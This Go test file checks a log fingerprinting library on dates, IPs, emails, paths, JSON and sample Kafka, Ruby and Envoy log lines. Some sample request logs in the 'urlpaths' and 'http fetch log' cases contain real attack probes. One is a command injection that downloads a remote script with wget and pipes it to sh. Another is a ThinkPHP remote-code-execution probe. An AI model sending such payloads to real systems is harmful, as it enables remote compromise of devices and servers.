// Copyright (C) 2025 CardinalHQ, Inc
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU Affero General Public License as
// published by the Free Software Foundation, version 3.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
// GNU Affero General Public License for more details.
//
// You should have received a copy of the GNU Affero General Public License
// along with this program. If not, see <http://www.gnu.org/licenses/>.

package fingerprinter

import (
	"bufio"
	"log"
	"os"
	"strings"
	"testing"

	"github.com/stretchr/testify/require"
	"go.opentelemetry.io/collector/pdata/plog"

	"github.com/stretchr/testify/assert"
)

func TestFingerprinterWithKafkaBroker0(t *testing.T) {
	file, err := os.Open("testdata/kafka-broker-0.txt")
	if err != nil {
		t.Fatal(err)
	}
	defer func() { _ = file.Close() }()
	scanner := bufio.NewScanner(file)
	fp := NewFingerprinter()
	for scanner.Scan() {
		input := scanner.Text()
		t.Run(input, func(t *testing.T) {
			_, _, err := fp.testTokenizeString(strings.ToLower(input))
			assert.NoError(t, err)
		})
	}
}

func TestFingerprinter(t *testing.T) {
	tests := []struct {
		name      string
		input     string
		want      string
		wantLevel string
		wantJSON  []string
	}{
		{
			"empty",
			"",
			"",
			"",
			nil,
		},
		{
			"simple",
			"hello world",
			"hello world",
			"",
			nil,
		},
		{
			"date YYYY-MM-DD",
			"2024-01-02",
			"<Date>",
			"",
			nil,
		},
		{
			"date YYYY/MM/DD",
			"2024/01/02",
			"<Date>",
			"",
			nil,
		},
		{
			"date DD/MM/YY",
			"02/01/24",
			"<Date>",
			"",
			nil,
		},
		{
			"time",
			"14:54:12",
			"<Time>",
			"",
			nil,
		},
		{
			"iso8601",
			"2024-01-02T14:54:12",
			"<ISO8601>",
			"",
			nil,
		},
		{
			"iso8601 with Z",
			"2024-01-02T14:54:12Z",
			"<ISO8601>",
			"",
			nil,
		},
		{
			"iso8601 with timezone",
			"2024-01-02T14:54:12+01:00",
			"<ISO8601>",
			"",
			nil,
		},
		{
			"uuid",
			"dddddddd-dddd-dddd-dddd-dddddddddddd",
			"<UUID>",
			"",
			nil,
		},
		{
			"ipv4",
			"10.42.255.254",
			"<IPv4>",
			"",
			nil,
		},
		{
			"simple email address",
			"alice@example.com",
			"<Email>",
			"",
			nil,
		},
		{
			"email with _",
			"alice_smith@example.com",
			"<Email>",
			"",
			nil,
		},
		{
			"email with -",
			"alice-smith@example.com",
			"<Email>",
			"",
			nil,
		},
		{
			"email with +",
			"alice+smith@example.com",
			"<Email>",
			"",
			nil,
		},
		{
			"email with .",
			"alice.smith@example.com",
			"<Email>",
			"",
			nil,
		},
		{
			"example.com",
			"example.com",
			"<FQDN>",
			"",
			nil,
		},
		{
			"path alone",
			" /api/v10/endpoint",
			"<Path>",
			"",
			nil,
		},
		{
			"path with version",
			"bob /api/v10/endpoint",
			"bob <Path>",
			"",
			nil,
		},
		{
			"test case 1",
			"2024-12-14T00:46:28.852Z pid=9 tid=12msap class=SearchSyncWorker jid=96322f73c635d6812fd60163 INFO: start",
			"<ISO8601> <Number> tid <Identifier> <Loglevel> start",
			"info",
			nil,
		},
		{
			"test case 2",
			"2024-12-14T00:46:28.852Z pid=9 tid=12xsap class=SearchSyncWorker jid=96322f73c635d6812fd60163 INFO: start",
			"<ISO8601> <Number> tid <Identifier> <Loglevel> start",
			"info",
			nil,
		},
		{
			"sample log 1",
			`2024-04-17 00:37:23.147 ERROR 1 --- [lt-dispatcher-5] c.g.d.TelemetryEmitter : Received error code 400, endpoint = /api/v10/endpoint`,
			"<Date> <Time> <Loglevel> <Number> <Identifier> received error code <Number> endpoint <Path>",
			"error",
			nil,
		},
		{
			"sample log 2",
			`	advertised.listeners = CLIENT://kafka-kraft-broker-0.kafka-kraft-broker-headless.default.svc.cluster.local:9092,INTERNAL://kafka-kraft-broker-0.kafka-kraft-broker-headless.default.svc.cluster.local:9094
`,
			"<FQDN> <Url> <Url>",
			"",
			nil,
		},
		{
			"sample log 3",
			`   foo = CLIENT://:1234,INTERNAL://:5678`,
			"foo <Url> <Url>",
			"",
			nil,
		},
		{
			"sample log 4",
			`Receive ListRecommendations for product ids:['OLJCESPC7Z', '6E92ZMYYFZ', '1YMWWN1N4O', 'L9ECAV7KIM', '2ZYFJ3GM2N']`,
			"receive listrecommendations for product <Identifier> <List>",
			"",
			nil,
		},
		{
			"go module",
			"chqs3exporter@v0.31.0/exporter.go:142",
			"<ModuleName>",
			"",
			nil,
		},
		{
			"truncates at newline",
			"2024-06-16T18:37:46.053Z	info	chqs3exporter@v0.31.0/exporter.go:142	Wrote buffer\n15 lines written to file foo.bar",
			"<ISO8601> <Loglevel> <ModuleName> wrote buffer",
			"info",
			nil,
		},
		{
			"mixed json go log",
			`2024-06-16T18:37:46.053Z	info	chqs3exporter@v0.31.0/exporter.go:142	Wrote buffer	{"kind": "exporter", "data_type": "traces", "name": "chqs3/chqside", "telemetryType": "traces", "timebox": 1718562910000, "prefix": "traces_1718562910000", "rows": 398}`,
			"<ISO8601> <Loglevel> <ModuleName> wrote buffer",
			"info",
			[]string{"data_type", "kind", "name", "prefix", "rows", "telemetryType", "timebox"},
		},
		{
			"big json",
			`{
  "level": "INFO",
  "time": "2024-06-16T18:41:32.309Z",
  "pid": 1,
  "hostname": "license-service-67665d5cbc-kxjwm",
  "req": {
    "id": 10498845,
    "method": "GET",
    "url": "/license/validate/SLWHPA",
    "query": {},
    "params": {},
    "headers": {
      "host": "license-service.movies-demo.svc.cluster.local:3000",
      "connection": "keep-alive",
      "x-datadog-trace-id": "7967234482582441354",
      "x-datadog-parent-id": "7099643630873179430",
      "x-datadog-sampling-priority": "1",
      "x-datadog-tags": "_dd.p.dm=-1,_dd.p.tid=666f31dc00000000",
      "traceparent": "00-666f31dc000000006e914d8cb891cd8a-628700444a0f7526-01",
      "tracestate": "dd=s:1;p:628700444a0f7526;t.dm:-1;t.tid:666f31dc00000000",
      "accept": "*/*",
      "accept-language": "*",
      "sec-fetch-mode": "cors",
      "user-agent": "node",
      "accept-encoding": "gzip, deflate"
    },
    "remoteAddress": "::ffff:10.0.7.2",
    "remotePort": 45536
  },
  "msg": "Received license validation request for movieId=SLWHPA"
}`,
			"inforeceived license validation request for movieid <Identifier>",
			"info",
			[]string{
				"hostname", "level", "msg", "pid",
				"req.headers.accept", "req.headers.accept-encoding", "req.headers.accept-language",
				"req.headers.connection", "req.headers.host", "req.headers.sec-fetch-mode",
				"req.headers.traceparent", "req.headers.tracestate", "req.headers.user-agent",
				"req.headers.x-datadog-parent-id", "req.headers.x-datadog-sampling-priority",
				"req.headers.x-datadog-tags", "req.headers.x-datadog-trace-id",
				"req.id", "req.method", "req.remoteAddress", "req.remotePort", "req.url",
				"time",
			},
		},
		{
			"path with url characters like %aa, &, =",
			"/api/v1/endpoint?query=foo&bar=baz",
			"<Path>",
			"",
			nil,
		},
	}

	for _, tt := range tests {
		fp := NewFingerprinter()
		t.Run(tt.name, func(t *testing.T) {
			tokenMap, level, jsonKeys, err := fp.testTokenizeInput(tt.input)
			assert.NoError(t, err, "input: %s", tt.input)
			assert.Equal(t, tt.want, strings.Join(tokenMap.items, " "), "input: %s", tt.input)
			assert.Equal(t, tt.wantLevel, level, "input: %s", tt.input)
			assert.Equal(t, tt.wantJSON, jsonKeys, "input: %s", tt.input)
		})
	}
}

func TestFingerprinterWithLineLimit(t *testing.T) {
	tests := []struct {
		name  string
		input string
		want  string
	}{
		{
			"simple",
			"hello world",
			"hello world",
		},
		{
			"long",
			"hello 12345" + strings.Repeat(" foo bar", 10),
			"hello <Number> foo bar foo",
		},
	}
	for _, tt := range tests {
		fp := NewFingerprinter(WithMaxTokens(5))
		t.Run(tt.name, func(t *testing.T) {
			tokenMap, _, jsonKeys, err := fp.testTokenizeInput(tt.input)
			assert.NoError(t, err)
			assert.Nil(t, jsonKeys)
			assert.Equal(t, tt.want, strings.Join(tokenMap.items, " "))
		})
	}
}

func BenchmarkFingerprinter1(b *testing.B) {
	input := "[2024-04-06 21:23:32,742] INFO [GroupCoordinator 100]: Preparing to rebalance group metadata.ingest.stats.consumer in state PreparingRebalance with old generation 14 (__consumer_offsets-14) (reason: Adding new member metadata.ingest.stats.consumer-0-e78065b6-0f83-4397-92ae-965997f4b1a2 with group instance id Some(metadata.ingest.stats.consumer-0); client reason: not provided) (kafka.coordinator.group.GroupCoordinator)"
	clusterManager := NewTrieClusterManager(0.5)
	fp := NewFingerprinter()
	log.Printf("Running loop for %d times", b.N)
	for b.Loop() {
		_, _, err := fp.Fingerprint(input, clusterManager)
		if err != nil {
			b.Fatal(err)
		}
	}
}

func TestSplitWords(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected []string
	}{
		{
			"empty",
			"",
			nil,
		},
		{
			"snake_case",
			"hello_world",
			[]string{"hello", "world"},
		},
		{
			"camelCase",
			"helloWorld",
			[]string{"hello", "world"},
		},
		{
			"CamelCase",
			"HelloWorld",
			[]string{"hello", "world"},
		},
		{
			"longer_snake_case",
			"hello_world_this_is_a_test",
			[]string{"hello", "world", "this", "is", "a", "test"},
		},
		{
			"longer_camelCase",
			"helloWorldThisIsATest",
			[]string{"hello", "world", "this", "is", "a", "test"},
		},
		{
			"longer_CamelCase",
			"HelloWorldThisIsATest",
			[]string{"hello", "world", "this", "is", "a", "test"},
		},
		{
			"THISIsATest",
			"THISIsATest",
			[]string{"t", "h", "i", "s", "is", "a", "test"},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			assert.Equal(t, tt.expected, splitWords(tt.input))
		})
	}
}

func TestIsWord(t *testing.T) {
	fp := NewFingerprinter()

	tests := []struct {
		name     string
		word     string
		expected bool
	}{
		{
			"existing word",
			"hello",
			true,
		},
		{
			"non-existing word",
			"xyznonexistent",
			false,
		},
		{
			"entirely uppercase word",
			"WORLD",
			true,
		},
		{
			"CamelCase",
			"HelloWorld",
			true,
		},
		{
			"cammelCase",
			"helloWorld",
			true,
		},
		{
			"multiple words with non-existing word",
			"hello baz",
			false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			actual := fp.IsWord(tt.word)
			assert.Equal(t, tt.expected, actual)
		})
	}
}

func TestFindJSONContent(t *testing.T) {
	tests := []struct {
		name          string
		input         string
		expectedMsg   string
		expectedJSON  string
		expectedExtra string
	}{
		{
			"no JSON content",
			"Hello, world!",
			"",
			"",
			"",
		},
		{
			"JSON content with prefix and suffix",
			`Message: {"key": "value"} Extra`,
			"Message: ",
			`{"key": "value"}`,
			" Extra",
		},
		{
			"JSON content with prefix",
			`Prefix: {"key": "value"}`,
			"Prefix: ",
			`{"key": "value"}`,
			"",
		},
		{
			"JSON content with suffix",
			`{"key": "value"} Suffix`,
			"",
			`{"key": "value"}`,
			" Suffix",
		},
		{
			"JSON content without prefix and suffix",
			`{"key": "value"}`,
			"",
			`{"key": "value"}`,
			"",
		},
		{
			"nested JSON content",
			`Message: {"key": {"nested": "value"}} Extra`,
			"Message: ",
			`{"key": {"nested": "value"}}`,
			" Extra",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			msg, json, extra := findJSONContent(tt.input)
			assert.Equal(t, tt.expectedMsg, msg)
			assert.Equal(t, tt.expectedJSON, json)
			assert.Equal(t, tt.expectedExtra, extra)
		})
	}
}

func TestGetStringKey(t *testing.T) {
	data := map[string]any{
		"message":  "Hello, world!",
		"level":    "INFO",
		"loglevel": "DEBUG",
	}

	tests := []struct {
		name     string
		keys     []string
		expected string
	}{
		{
			"existing key",
			[]string{"message"},
			"Hello, world!",
		},
		{
			"non-existing key",
			[]string{"timestamp"},
			"",
		},
		{
			"multiple keys with existing key",
			[]string{"level", "loglevel"},
			"INFO",
		},
		{
			"multiple keys with non-existing key",
			[]string{"timestamp", "severity"},
			"",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			actual := getStringKey(data, tt.keys...)
			assert.Equal(t, tt.expected, actual)
		})
	}
}

func BenchmarkIsWord(b *testing.B) {
	fp := NewFingerprinter()

	for b.Loop() {
		fp.IsWord("heLLo")
	}
}

func TestTokenMapConstruction(t *testing.T) {
	clusterManager := NewTrieClusterManager(0.5)
	fp := NewFingerprinter()
	fingerprint, level, err := fp.Fingerprint("INFO Received request for /api/v1/endpoint from userId=12345", clusterManager)
	assert.NoError(t, err)
	assert.NotEqual(t, 0, fingerprint)
	assert.Equal(t, level, "info")
}

func TestJSONBodyFingerprint(t *testing.T) {
	exemplarData, err := os.ReadFile("testdata/payload.json")
	require.NoError(t, err, "Failed to read exemplar data")

	unmarshaller := plog.JSONUnmarshaler{}
	logs, err := unmarshaller.UnmarshalLogs(exemplarData)
	require.NoError(t, err)
	lr := logs.ResourceLogs().At(0).ScopeLogs().At(0).LogRecords().At(0)
	msg := lr.Body().AsString()
	clusterManager := NewTrieClusterManager(0.5)
	fp := NewFingerprinter()
	fingerprint, _, err := fp.Fingerprint(msg, clusterManager)
	assert.NoError(t, err)
	assert.Equal(t, int64(-2925397474039508433), fingerprint)
}

func TestFingerprintIdenticality(t *testing.T) {
	tests := []struct {
		name       string
		inputs     []string
		tokens     []string
		expectJSON bool
	}{
		{
			"simple",
			[]string{
				"INFO Received request for /api/v1/endpoint from userId=65431",
				"INFO Received request for /api/v1/endpoint from userId=12345",
			},
			[]string{
				"<Loglevel>", "received", "request", "for", "<Path>", "from", "userid", "<Number>",
			},
			false,
		},
		{
			"urlpaths",
			[]string{
				`[a0b0fa04-0423-4760-8757-cb0dc85f90d4] Started GET "/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.163.215.73%2Fmoo+-O-+|+sh%60)" for 31.220.1.144 at 2025-01-13 17:26:27 +0000`,
				`[703060d9-20ef-4b3e-b161-65c637c4d88b] Started GET "/api/index.php/v1/config/application?public=true&page%5Boffset%5D=0&page%5Blimit%5D=60" for 66.63.187.168 at 2025-01-13 07:48:20 +0000`,
				`[482cab3b-ad79-4988-8fd7-0bf618489cd2] Started GET "/tickets/search?query=test" for 54.162.8.237 at 2025-01-13 18:10:58 +0000`,
				`[6f70bf33-6efe-496b-9359-346da9e2ddca] Started GET "/" for 18.188.222.160 at 2025-01-13 18:10:44 +0000`,
				`[7e258c35-89e2-4dd8-b7a4-9e5533111403] Started GET "/search/tickets?account_id=11&page=&per_page=&query=test" for 54.162.8.237 at 2025-01-13 07:49:29 +0000`,
				`[33e7b1c4-e224-42fb-8d47-659e9eb07d39] Started GET "/search/tickets?account_id=11&page=&per_page=&query=test" for 54.162.8.237 at 2025-01-13 18:10:34 +0000`,
			},
			[]string{
				"<UUID>", "started", "<HTTPMethod>", "<Identifier>", "for", "<IPv4>", "at", "<Date>", "<Time>", "<Number>",
			},
			false,
		},
		{
			"http fetch log",
			[]string{
				`[2025-01-13T18:23:37.190Z] "GET /fcp/alb-health HTTP/1.1" 200 - via_upstream - "-" 0 0 0 0 "172.25.31.44" "ELB-HealthChecker/2.0" "1d297bf7-5284-4509-9953-905f42d79089" "172.25.27.114:8080" "172.25.27.204:15021" outbound|15021||istio-ingressgateway.istio-system.svc.cluster.local 172.25.27.114:32850 172.25.27.114:8080 172.25.31.44:3728 - -`,
				`[2025-01-13T18:22:44.634Z] "GET /search/tickets?account_id=11&page=&per_page=&query=test HTTP/1.1" 200 - via_upstream - "-" 0 2654 42 42 "54.162.8.237,172.25.19.220" "Typhoeus - https://github.com/typhoeus/typhoeus" "426808e9-6a3e-4017-a063-573fe11cc1fc" "search-service.freshstatus-sta91ng.io" "172.25.29.139:8181" outbound|80|BLUE|aiops-search.ams-aiops-search-staging.svc.cluster.local 172.25.27.114:51834 172.25.27.114:8080 172.25.19.220:4130 - -`,
				`[2025-01-12T19:16:00.058Z] "GET /public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.1" 404 - via_upstream - "-" 0 0 2 2 "47.236.49.157,172.25.19.220" "Custom-AsyncHttpClient" "f85b6908-834d-451f-bb44-59dc10dcd02e" "34.225.43.120" "172.25.26.133:8181" outbound|80|BLUE|aiops-tickets.ams-aiops-tickets-staging.svc.cluster.local 172.25.27.204:60516 172.25.27.204:8080 172.25.19.220:13224 - -`,
				`[2025-01-13T07:54:30.125Z] "POST /search/tickets?account_id=11 HTTP/1.1" 201 - via_upstream - "-" 135 146 13 13 "54.162.8.237,172.25.19.220" "Typhoeus - https://github.com/typhoeus/typhoeus" "c7953b6b-02df-47bd-9970-b8325caca796" "search-service.freshstatus-sta91ng.io" "172.25.29.139:8181" outbound|80|BLUE|aiops-search.ams-aiops-search-staging.svc.cluster.local 172.25.27.114:51834 172.25.27.114:8080 172.25.19.220:15370 - -`,
			},
			[]string{
				"<ISO8601>", "<Identifier>", "<Number>", "<Identifier>", "<Number>", "<Number>", "<Number>", "<Number>", "<Identifier>", "<IPv4>", "<IPv4>", "<IPv4>",
			},
			false,
		},
		{
			"ruby log 1",
			[]string{
				`[db1f5d56-8ba1-42e3-92ec-2267d6952f1d]   Parameters: {"title"=>"Sit sint voluptas quis.", "description"=>"Vel sunt quia. Esse sed laboriosam. Nesciunt quis velit.", "external_id"=>584672, "account_id"=>"11", "ticket"=>{"title"=>"Sit sint voluptas quis.", "description"=>"Vel sunt quia. Esse sed laboriosam. Nesciunt quis velit.", "external_id"=>584672}}`,
				`[2e041c15-5379-4a35-ab68-979fa36f4a95]   Parameters: {"title"=>"Vel beatae quia tenetur.", "description"=>"Non asperiores et. Minus dolore impedit. Quia fugit nihil.", "external_id"=>583052, "account_id"=>"11", "ticket"=>{"title"=>"Vel beatae quia tenetur.", "description"=>"Non asperiores et. Minus dolore impedit. Quia fugit nihil.", "external_id"=>583052}}`,
				`[4b872f76-e377-488a-837e-d9dc58e6449c]   Parameters: {"title"=>"Minus aut quia sapiente.", "description"=>"Eius ea quibusdam. Quis error qui. Sit nemo non.", "external_id"=>582086, "account_id"=>"11", "ticket"=>{"title"=>"Minus aut quia sapiente.", "description"=>"Eius ea quibusdam. Quis error qui. Sit nemo non.", "external_id"=>582086}}`,
				`[2f9de893-510f-462b-ab86-6688950f9279]   Parameters: {"title"=>"Aspernatur cum quam eius.", "description"=>"Ad quae rerum. Vitae sit cum. Nostrum cupiditate officia.", "external_id"=>582875, "account_id"=>"11", "ticket"=>{"title"=>"Aspernatur cum quam eius.", "description"=>"Ad quae rerum. Vitae sit cum. Nostrum cupiditate officia.", "external_id"=>582875}}`,
				`[0a64cd4c-ea19-4fd4-9a4a-b8041b9983e4]   Parameters: {"title"=>"Eos optio dolor quisquam.", "description"=>"Voluptas alias provident. Voluptas vel quibusdam. Ullam nemo et.", "external_id"=>583909, "account_id"=>"11", "ticket"=>{"title"=>"Eos optio dolor quisquam.", "description"=>"Voluptas alias provident. Voluptas vel quibusdam. Ullam nemo et.", "external_id"=>583909}}`,
			},
			[]string{
				"<UUID>", "parameters",
			},
			true,
		},
		{
			"ruby log 2",
			[]string{
				`[6bb25604-7530-4f81-b4e2-9009773c5c0a]   Parameters: {"title"=>"Architecto et quis et.", "description"=>"Id qui ea. Vel ut sint. Ab est aut.", "ticket"=>{"title"=>"Architecto et quis et.", "description"=>"Id qui ea. Vel ut sint. Ab est aut."}}`,
				`[3727496e-34f1-4f0d-9f77-b870518a5ad1]   Parameters: {"title"=>"Ullam est provident repudiandae.", "description"=>"Aliquid assumenda libero. Ut aut ut. Sed quia corrupti.", "ticket"=>{"title"=>"Ullam est provident repudiandae.", "description"=>"Aliquid assumenda libero. Ut aut ut. Sed quia corrupti."}}`,
				`[9c3bf15a-a607-4d76-850c-cfd11fb53bc1]   Parameters: {"title"=>"Vel dolorum nemo similique.", "description"=>"In exercitationem aliquam. Dicta reiciendis repudiandae. Distinctio nihil reprehenderit.", "ticket"=>{"title"=>"Vel dolorum nemo similique.", "description"=>"In exercitationem aliquam. Dicta reiciendis repudiandae. Distinctio nihil reprehenderit."}}`,
				`[8271cf6f-bc79-4bea-9240-e0152785f687]   Parameters: {"title"=>"Aspernatur cum quam eius.", "description"=>"Ad quae rerum. Vitae sit cum. Nostrum cupiditate officia.", "ticket"=>{"title"=>"Aspernatur cum quam eius.", "description"=>"Ad quae rerum. Vitae sit cum. Nostrum cupiditate officia."}}`,
				`[c3d02c60-12ac-48c3-8d9a-563693ca4a08]   Parameters: {"title"=>"Nemo esse nihil rerum.", "description"=>"Placeat non saepe. Maxime quia ipsam. Accusantium est aut.", "ticket"=>{"title"=>"Nemo esse nihil rerum.", "description"=>"Placeat non saepe. Maxime quia ipsam. Accusantium est aut."}}`,
			},
			[]string{
				"<UUID>", "parameters",
			},
			true,
		},
		{
			"ruby log 3",
			[]string{
				"[de5515ba-98a0-4c1d-be32-ae61152cb0b8]   \033[1m\033[36mTicket Create (1.8ms)\033[0m  \033[1m\033[32mINSERT INTO `tickets` (`title`, `description`, `external_id`, `account_id`, `created_at`, `updated_at`) VALUES ('Et dignissimos debitis voluptatum.', 'Omnis dolor error. Deleniti sint hic. Labore omnis id.', 585378, 11, '2025-01-13 17:42:43.050272', '2025-01-13 17:42:43.050272')\033[0m",
				"[5b3d31c9-7fc8-4b4b-a38f-b0bcf82434a6]   \033[1m\033[36mTicket Create (1.6ms)\033[0m  \033[1m\033[32mINSERT INTO `tickets` (`title`, `description`, `external_id`, `account_id`, `created_at`, `updated_at`) VALUES ('Occaecati illum voluptas quibusdam.', 'Excepturi tenetur non. Ullam incidunt expedita. Explicabo earum reiciendis.', 584719, 11, '2025-01-13 07:03:52.694513', '2025-01-13 07:03:52.694513')\033[0m",
				"[5d8d83e3-d52c-461e-8c7c-4b10eab2a159]   \033[1m\033[36mTicket Create (1.7ms)\033[0m  \033[1m\033[32mINSERT INTO `tickets` (`title`, `description`, `external_id`, `account_id`, `created_at`, `updated_at`) VALUES ('Est sit itaque illum.', 'Aliquam assumenda consequatur. Porro doloribus perspiciatis. Illum cumque voluptate.', 584482, 11, '2025-01-13 03:04:32.161775', '2025-01-13 03:04:32.161775')\033[0m",
				"[1a56410f-a24d-4a6b-aad9-dd4267069f20]   \033[1m\033[36mTicket Create (1.7ms)\033[0m  \033[1m\033[32mINSERT INTO `tickets` (`title`, `description`, `external_id`, `account_id`, `created_at`, `updated_at`) VALUES ('Quis beatae enim iste.', 'Reprehenderit voluptas rem. Porro cupiditate amet. Atque recusandae eius.', 585360, 11, '2025-01-13 17:28:12.478078', '2025-01-13 17:28:12.478078')\033[0m",
				"[1a41a6cb-28e9-4806-a40b-822a38fb4630]   \033[1m\033[36mTicket Create (1.6ms)\033[0m  \033[1m\033[32mINSERT INTO `tickets` (`title`, `description`, `external_id`, `account_id`, `created_at`, `updated_at`) VALUES ('Dignissimos repellendus et quam.', 'Minima laboriosam aut. Quas sapiente ut. Facilis ipsa animi.', 585165, 11, '2025-01-13 14:07:36.160576', '2025-01-13 14:07:36.160576')\033[0m",
			},
			[]string{
				"<UUID>", "ticket", "create", "<Duration>", "insert", "into", "<Identifier>", "values", "<Identifier>", "<Number>", "<Number>", "<Identifier>",
			},
			false,
		},
		{
			"ruby log 4",
			[]string{
				`[405feaa8-b91d-4367-b8cb-4a52c7f549a9] Completed 200 OK in 1118ms (Views: 0.0ms | ActiveRecord: 892.0ms (3 queries, 0 cached) | GC: 0.5ms)`,
				`[857c814b-b0f6-470e-88df-a9185079c765] Completed 200 OK in 37ms (Views: 1.8ms | ActiveRecord: 34.0ms (2 queries, 0 cached) | GC: 0.2ms)`,
			},
			[]string{
				"<UUID>", "completed", "<Number>", "ok", "in", "<Duration>", "views", "<Duration>", "activerecord", "<Duration>", "<Number>", "queries", "<Number>", "cached", "<Duration>",
			},
			false,
		},
		{
			"specified key does not exist",
			[]string{
				`The specified key does not exist. (Service: Amazon S3; Status Code: 404; Error Code: NoSuchKey; Request ID: YGNRA466620F3JZ2; S3 Extended Request ID: i92XzeWekngbw+nl+99Pn6uUOADxsf1aVk/Mdu7RYxdfhXXl52ax9zzLNB02Z5FRS7kNe3+El3IG2z3H1C/fvO823H5QVWexLykYZGHt+7M=; Proxy: null)`,
				`The specified key does not exist. (Service: Amazon S3; Status Code: 404; Error Code: NoSuchKey; Request ID: YGNJ3ZWYAG1NHK4R; S3 Extended Request ID: FLs5T4nLTASwoIfL9w4N3jUsD+qM/GfeEP1yepSkMuVzBJ2C7R0cfKnWsfoekGxNr9oTcCM4pR1xF8hObhY1TppKzPkX70mn62bRFhD8DzY=; Proxy: null)`,
				`The specified key does not exist. (Service: Amazon S3; Status Code: 404; Error Code: NoSuchKey; Request ID: GQNDT8W5ZT2MDCXY; S3 Extended Request ID: DoEXTB+nKImWcRc2OW/xR6fNVvaaMzaGPpAedeS0qUoYnRXlWAfadnGF/XNqn3N1CqjYL2d2yDk=; Proxy: null)`,
				`The specified key does not exist. (Service: Amazon S3; Status Code: 404; Error Code: NoSuchKey; Request ID: 35RM8V8QXF53KQG4; S3 Extended Request ID: HDPgTMmPswV376FyTJyJwwHWrqWNxbTBWZJ8PB4P2GKoFuz7kMeuWImFJ0d45aivnfgPmdx4kqEGgv0uEGvGVWQB0JUeGMDq9rok1+l/IUA=; Proxy: null)`,
			},
			[]string{
				"the", "specified", "key", "does", "not", "service", "amazon", "s3", "status", "code", "<Number>", "<Loglevel>", "code", "nosuchkey", "request", "id", "<Identifier>", "s3", "extended", "request", "id", "<Identifier>", "proxy", "null",
			},
			false,
		},
	}

	clusterManager := NewTrieClusterManager(0.5)
	fp := NewFingerprinter(WithMaxTokens(25))

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			fingerprint1, _, err := fp.Fingerprint(tt.inputs[0], clusterManager)
			require.NoError(t, err)
			// Note: We no longer check for JSON since it's not returned
			for i := 1; i < len(tt.inputs); i++ {
				fingerprint2, _, err := fp.Fingerprint(tt.inputs[i], clusterManager)
				require.NoError(t, err)
				require.Equal(t, fingerprint1, fingerprint2)
			}
		})
	}
}

func TestFingerprintJSON(t *testing.T) {
	tests := []struct {
		name                string
		input               string
		expectedFingerprint int64
	}{
		{
			"simple JSON 'alice bob'",
			`{"msg": "alice bob", "key": "value"}`,
			-4799080351441142732,
		},
		{
			"complex JSON 'alice john'",
			`{"msg": "alice john", "user": {"id": 123, "name": "John Doe"}, "action": "login", "timestamp": "2024-06-16T18:41:32.309Z"}`,
			-1298215320945995457,
		},
		{
			"complex JSON 'alice nancy'",
			`{"msg": "alice nancy", "user": {"id": 123, "name": "John Doe"}, "action": "login", "timestamp": "2024-06-16T18:41:32.309Z"}`,
			-4204312781059083134,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			clusterManager := NewTrieClusterManager(0.5)
			fp := NewFingerprinter()
			fingerprint, _, err := fp.Fingerprint(tt.input, clusterManager)
			assert.NoError(t, err)
			assert.Equal(t, tt.expectedFingerprint, fingerprint, "input: %s", tt.input)
			// Note: We no longer check for JSON since it's not returned
		})
	}
}
